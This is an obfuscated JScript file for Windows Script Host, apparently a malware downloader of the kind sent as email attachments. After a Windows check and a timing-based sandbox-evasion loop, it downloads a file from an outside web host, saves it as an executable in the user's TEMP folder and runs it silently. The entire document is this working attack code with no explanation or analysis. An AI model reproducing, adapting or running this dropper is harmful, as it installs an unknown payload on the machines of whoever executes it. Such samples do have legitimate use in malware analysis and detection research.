var de = false;
var Ez = "CreateObject";
var rh = function u() {return WScript[Ez]("WScript.Shell");}(), A0 = 11;
var Nr = "MSXML2.XMLHTTP";
var c = 2123213;
var SV = 0;
function Wk(mP){rh["Run"](mP, SV, SV);};
function Z(){return "" + Nr;};
function h0(r, Sm0){SV = SV * 1; return r - Sm0;};
function V(){return Ez;};
/*@cc_on
  @if (@_win32 || @_win64)
    de = true;
  @end
@*/
if (de)
{
var IR = "";
function VT(){return 22;};
var z0 = 0; var A = 0;
function M()
{
var Xi = new this["Date"]();
var g0 = Xi["getUTCMilliseconds"]();
WScript["Sleep"](VT());
var Xi = new this["Date"]();
var s = Xi["getUTCMilliseconds"]();
WScript["Sleep"](VT());
var Xi = new this["Date"]();
var sc = Xi["getUTCMilliseconds"]();
var z0 = "cq";
z0 = h0(s, g0);
var A = "z";
A = h0(sc, s);
IR = "open";
return h0(z0, A);
}
var ac = false;
var v = false;
for (var g = SV; g < VT() * 1; g++){if (M() != SV){
ac = true; 
A = "31" + 11 * z0 + A; 
v = true; 
break;
}}
function W() {return ((ac == true) && (ac == v)) ? 1 : SV;};
if (ac && W() && v){
function h() {return rh["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "RBxj0ippwQI8ONG.exe";};
 I = Z();
 j = WScript[Ez](I);
 var td = 1;
 while (td){
try {
j[IR]("GET", "http://caferacerpneus.com.br/lw2osd", false);
j["send"]();
HK = "Sleep";
for (;;){WScript[HK](VT() * 11); if (j["readystate"] >= 2 * 2) break;};
td = SV;
} catch(T){};
}
function ka(Sm) {var D = (1, 2, 3, 4, 5, Sm); return D;};
oS = WScript[V()]("ADODB.Stream");
I = oS;
I[IR]();
I["type"] = ka(1);
I["write"](j["ResponseBody"]);
oS["position"] = ka(SV);
I["Save" + "ToFile"](h(), 2);
oS["c"+"lose"]();
nG = h();
Wk(nG);
}
}

